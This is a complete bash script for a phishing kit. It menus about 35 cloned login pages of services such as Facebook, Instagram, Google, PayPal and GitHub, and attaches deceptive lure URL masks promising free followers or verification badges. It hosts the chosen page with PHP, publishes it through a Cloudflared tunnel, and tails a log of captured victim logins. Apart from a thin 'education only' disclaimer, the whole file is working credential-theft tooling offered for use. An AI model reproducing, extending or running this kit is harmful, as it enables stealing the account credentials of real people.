#!/bin/bash

# Colors
BLACK="\033[0;30m"
RED="\033[0;31m"
GREEN="\033[0;32m"
YELLOW="\033[0;33m"
BLUE="\033[0;34m"
MAGENTA="\033[0;35m"
CYAN="\033[0;36m"
WHITE="\033[0;37m"
ORANGE='\033[1;33m'
BRIGHT_GREEN="\033[1;92m"
BRIGHT_CYAN="\033[1;96m"
BRIGHT_YELLOW="\033[1;93m"
NC="\033[0m"  # Reset

# Globals
HOST="127.0.0.1"
PHISH_DIR="sites"
SITE=""
PORT=""
MASK=""
WEBSITE=""

banner() {
    clear
    echo -e "${BRIGHT_CYAN}"
    echo -e "      █████▒▒ PHISHER-STYLE SITES CLONE ▒▒█████"
    echo -e "                  
                 ████▒▒ ${YELLOW}V1.1${BRIGHT_CYAN} ▒▒████"
    echo -e ""
    echo -e "  Feedback And Tell Which Phishing Sites You Want"
    echo -e "             Instagram = @Shyam.npl1"
    echo -e "             YouTube = @FactStreamZS"
    echo -e "${NC}"
}

banner_small() {
    echo -e "${BRIGHT_GREEN}▌ PHISHER ▐${NC}"
}

install_deps() {
    echo -e "${BRIGHT_GREEN}[+] Checking & Installing Dependencies...${NC}"
    packages=(php curl cloudflared)

    for package in "${packages[@]}"; do
        if ! command -v $package > /dev/null 2>&1; then
            echo -e "${BRIGHT_CYAN}[•] Installing $package...${NC}"
            pkg install -y $package > /dev/null 2>&1
        else
            echo -e "${BRIGHT_GREEN}[✓] $package found.${NC}"
        fi
    done
}

random_port() {
    if [[ -z "$PORT" ]]; then
        PORT=$(shuf -i 1111-9999 -n 1)
    fi
}

check_update() {
    echo -e "${BRIGHT_GREEN}[+] Checking for updates...${NC}"
    sleep 1
    echo -e "${BRIGHT_GREEN}[✓] You're using the latest version.${NC}"
}

select_site() {
    banner_small
    echo -e ""
    echo -e "${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt"
    echo -e "${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo"
    echo -e "${RED}[${WHITE}03${RED}]${ORANGE} Google        ${RED}[${WHITE}13${RED}]${ORANGE} Snapchat     ${RED}[${WHITE}23${RED}]${ORANGE} Origin"
    echo -e "${RED}[${WHITE}04${RED}]${ORANGE} Microsoft     ${RED}[${WHITE}14${RED}]${ORANGE} Linkedin     ${RED}[${WHITE}24${RED}]${ORANGE} DropBox"
    echo -e "${RED}[${WHITE}05${RED}]${ORANGE} Netflix       ${RED}[${WHITE}15${RED}]${ORANGE} Ebay         ${RED}[${WHITE}25${RED}]${ORANGE} Yahoo"
    echo -e "${RED}[${WHITE}06${RED}]${ORANGE} Paypal        ${RED}[${WHITE}16${RED}]${ORANGE} Quora        ${RED}[${WHITE}26${RED}]${ORANGE} Wordpress"
    echo -e "${RED}[${WHITE}07${RED}]${ORANGE} Steam         ${RED}[${WHITE}17${RED}]${ORANGE} Protonmail   ${RED}[${WHITE}27${RED}]${ORANGE} Yandex"
    echo -e "${RED}[${WHITE}08${RED}]${ORANGE} Twitter       ${RED}[${WHITE}18${RED}]${ORANGE} Spotify      ${RED}[${WHITE}28${RED}]${ORANGE} Stackoverflow"
    echo -e "${RED}[${WHITE}09${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit       ${RED}[${WHITE}29${RED}]${ORANGE} Vk"
    echo -e "${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}30${RED}]${ORANGE} Xbox"
    echo -e "${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github"
    echo -e "${RED}[${WHITE}34${RED}]${ORANGE} Discord       ${RED}[${WHITE}35${RED}]${ORANGE} Roblox"
    echo -e ""
    echo -e "${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit"
    echo -ne "\n${BRIGHT_CYAN}[>] Select phishing site: ${NC}"
    read choice

    case $choice in
        1) site_facebook ;;
        2) site_instagram ;;
        3) site_gmail ;;
        29) site_vk ;;
        99) about ;;
        0) exit ;;
        *)
            normal_sites $choice
            ;;
    esac
}

normal_sites() {
    case $1 in
        4) WEBSITE="microsoft" ;;
        5) WEBSITE="netflix" ;;
        6) WEBSITE="paypal" ;;
        7) WEBSITE="steam" ;;
        8) WEBSITE="twitter" ;;
        9) WEBSITE="playstation" ;;
        10) WEBSITE="tiktok" ;;
        11) WEBSITE="twitch" ;;
        12) WEBSITE="pinterest" ;;
        13) WEBSITE="snapchat" ;;
        14) WEBSITE="linkedin" ;;
        15) WEBSITE="ebay" ;;
        16) WEBSITE="quora" ;;
        17) WEBSITE="protonmail" ;;
        18) WEBSITE="spotify" ;;
        19) WEBSITE="reddit" ;;
        20) WEBSITE="adobe" ;;
        21) WEBSITE="deviantart" ;;
        22) WEBSITE="badoo" ;;
        23) WEBSITE="origin" ;;
        24) WEBSITE="dropbox" ;;
        25) WEBSITE="yahoo" ;;
        26) WEBSITE="wordpress" ;;
        27) WEBSITE="yandex" ;;
        28) WEBSITE="stackoverflow" ;;
        30) WEBSITE="xbox" ;;
        31) WEBSITE="mediafire" ;;
        32) WEBSITE="gitlab" ;;
        33) WEBSITE="github" ;;
        34) WEBSITE="discord" ;;
        35) WEBSITE="roblox" ;;
        *) echo -e "${RED}[!] Invalid option${NC}"; sleep 1; select_site ;;
    esac
    tunnel_menu
}

site_facebook() {
    echo -e "
${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page"
    echo -e "${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page"
    echo -e "${RED}[${WHITE}03${RED}]${ORANGE} Fake Security Login Page"
    echo -e "${RED}[${WHITE}04${RED}]${ORANGE} Facebook Messenger Login Page"
    echo ""

    read -p "$(echo -e "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${NC}")" fb_option
    case $fb_option in
        1) WEBSITE="facebook" MASK='https://blue-verified-badge-for-facebook-free' ;;
        2) WEBSITE="fb_advanced" MASK='https://vote-for-the-best-social-media' ;;
        3) WEBSITE="fb_security" MASK='https://make-your-facebook-secured-and-free-from-hackers' ;;
        4) WEBSITE="fb_messenger" MASK='https://get-messenger-premium-features-free' ;;
        *) echo -e "${RED}[!] Invalid option${NC}"; sleep 1; site_facebook ;;
    esac
    tunnel_menu
}

site_instagram() {
    echo -e "
${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page"
    echo -e "${RED}[${WHITE}02${RED}]${ORANGE} Auto Followers Login Page"
    echo -e "${RED}[${WHITE}03${RED}]${ORANGE} 1000 Followers Login Page"
    echo -e "${RED}[${WHITE}04${RED}]${ORANGE} Blue Badge Verify Login Page"
    echo ""

    read -p "$(echo -e "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${NC}")" ig_option
    case $ig_option in
        1) WEBSITE="instagram" MASK='https://get-unlimited-followers-for-instagram' ;;
        2) WEBSITE="ig_followers" MASK='https://get-unlimited-followers-for-instagram' ;;
        3) WEBSITE="insta_followers" MASK='https://get-1000-followers-for-instagram' ;;
        4) WEBSITE="ig_verify" MASK='https://blue-badge-verify-for-instagram-free' ;;
        *) echo -e "${RED}[!] Invalid option${NC}"; sleep 1; site_instagram ;;
    esac
    tunnel_menu
}

site_gmail() {
    echo -e "
${RED}[${WHITE}01${RED}]${ORANGE} Gmail Old Login Page"
    echo -e "${RED}[${WHITE}02${RED}]${ORANGE} Gmail New Login Page"
    echo -e "${RED}[${WHITE}03${RED}]${ORANGE} Advanced Voting Poll"
    echo ""

    read -p "$(echo -e "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${NC}")" gm_option
    case $gm_option in
        1) WEBSITE="google" MASK='https://get-unlimited-google-drive-free' ;;
        2) WEBSITE="google_new" MASK='https://get-unlimited-google-drive-free' ;;
        3) WEBSITE="google_poll" MASK='https://vote-for-the-best-social-media' ;;
        *) echo -e "${RED}[!] Invalid option${NC}"; sleep 1; site_gmail ;;
    esac
    tunnel_menu
}

site_vk() {
    echo -e "
${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page"
    echo -e "${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page"
    echo ""

    read -p "$(echo -e "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${NC}")" vk_option
    case $vk_option in
        1) WEBSITE="vk" MASK='https://vk-premium-real-method-2020' ;;
        2) WEBSITE="vk_poll" MASK='https://vote-for-the-best-social-media' ;;
        *) echo -e "${RED}[!] Invalid option${NC}"; sleep 1; site_vk ;;
    esac
    tunnel_menu
}

setup_site() {
    if [ ! -d "$PHISH_DIR/$WEBSITE" ]; then
        echo -e "${RED}[!] Site files for '$WEBSITE' not found.${NC}"
        exit 1
    fi
    cp -rf "$PHISH_DIR/$WEBSITE"/* .
}

capture_data() {
    echo -e "${BRIGHT_GREEN}[✓] Showing live login & victim logs... Press Ctrl+C to exit.${NC}"
    echo ""
    tail -f live_login.log
}

start_localhost() {
    random_port
    echo -e "\n${BRIGHT_GREEN}[+] Starting localhost on port $PORT...${NC}"
    setup_site
    php -S "$HOST:$PORT" > /dev/null 2>&1 &
    sleep 2
    echo -e "${BRIGHT_GREEN}[✓] Hosted at: ${BRIGHT_CYAN}http://$HOST:$PORT${NC}"
    capture_data
}

start_cloudflared() {
    random_port
    echo -e "\n${BRIGHT_GREEN}[+] Launching Cloudflared tunnel on port $PORT...${NC}"
    setup_site
    php -S "$HOST:$PORT" > /dev/null 2>&1 &
    sleep 5
    cloudflared tunnel --url "http://$HOST:$PORT" > .cfurl.log 2>&1 &
    sleep 8

    URL=$(grep -o 'https://[-a-zA-Z0-9]*\.trycloudflare.com' .cfurl.log | head -n 1)
    if [[ $URL ]]; then
        echo -e "${BRIGHT_GREEN}[✓] LIVE URL: ${BRIGHT_CYAN}$URL${NC}"
        capture_data
    else
        echo -e "${RED}[!] Failed to generate Cloudflared URL.${NC}"
    fi
}

tunnel_menu() {
    echo -e "\n${RED}[${WHITE}01${RED}]${BRIGHT_YELLOW} Localhost  ( ${GREEN}Random Port${BRIGHT_YELLOW} )"
    echo -e "${RED}[${WHITE}02${RED}]${BRIGHT_YELLOW} Cloudflared"
    echo -e "${RED}[${WHITE}03${RED}]${BRIGHT_YELLOW} Back to Site Selection"
    echo -e "${RED}[${WHITE}04${RED}]${BRIGHT_YELLOW} Exit"
    echo -ne "\n${BRIGHT_CYAN}[>] Choose attack method: ${NC}"
    read tunnel_option


    case $tunnel_option in
        1) start_localhost ;;
        2) start_cloudflared ;;
        3) select_site ;;
        0) exit ;;
        *) echo -e "${RED}[!] Invalid option${NC}"; sleep 1; tunnel_menu ;;
    esac
}

about() {
    clear
    echo -e "${BRIGHT_CYAN}About This Tool:${NC}"
    echo -e "${WHITE}This tool is developed for phishing site cloning education only.${NC}"
    echo -e "${WHITE}Instagram: @Shyam.npl1${NC}"
    echo -e "${WHITE}YouTube: @FactStreamZS${NC}"
    echo -ne "\n${BRIGHT_GREEN}Press Enter to return to menu...${NC}"
    read
    main_menu
}

main_menu() {
    banner
    install_deps
    check_update
    select_site
}

# Start
main_menu